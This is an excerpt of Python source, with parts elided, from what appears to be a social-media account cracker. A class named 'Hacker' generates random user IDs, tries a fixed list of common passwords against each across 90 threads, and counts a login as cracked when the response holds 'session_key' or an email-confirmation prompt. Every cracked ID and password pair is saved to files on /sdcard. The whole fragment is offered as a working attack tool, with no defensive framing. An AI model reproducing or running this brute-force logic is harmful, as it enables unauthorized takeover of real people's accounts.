...
class Hacker:
    ...
    def settings(self):
       ...
       self.limit=int(input("⋙ Enter Crack Limit : "));self.user=[]
       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(10));self.user.append(nmp)
       with tred(max_workers=90) as kidz:
           total=str(len(self.user));self.clear()
           print("⋙ Total Uid : %s"%(total))
           print("⋙ Use Data For Best Result ");self.linex()
           for xd in self.user:
               uid=str("10000"+xd);pas=['123456','123123','987654321','1234567','12345678','123456789','654321','1234567890','0987654321','112233']
       ...
       try:
          for ps in pas:
              ...
              if "Please Confirm Email" in str(po):
                 print(f"\r\r⋙ OK ⋙\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/OLD2-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              elif "session_key" in po:
                 print(f"\r\r⋙ OK ⋙\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/OLD2-OL.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              else:pass
          loop+=1
